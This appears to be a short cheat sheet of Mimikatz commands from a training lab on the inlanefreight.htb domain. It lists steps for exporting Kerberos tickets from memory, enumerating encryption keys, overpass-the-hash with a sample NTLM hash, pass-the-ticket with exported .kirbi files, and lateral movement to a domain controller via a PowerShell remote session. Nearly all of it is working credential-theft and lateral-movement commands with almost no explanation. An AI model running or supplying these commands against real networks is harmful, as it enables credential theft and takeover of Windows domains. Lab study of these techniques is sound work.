

# To get all Kerberos tickets

```powershell
privilege::debug
sekurlsa::tickets /export
```


#Note : To run this , you need to be administrator privilege




It is for all keys enumeration used by mimikatz

```cmd
sekurlsa::ekeys
```



## Pass the Key aka. OverPass the Hash

```cmd
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```



#  Pass the Ticket

```
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```




# Pass the Ticket for lateral movement.

```
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

then in Powershell
```
Enter-PSSession -ComputerName DC01
```

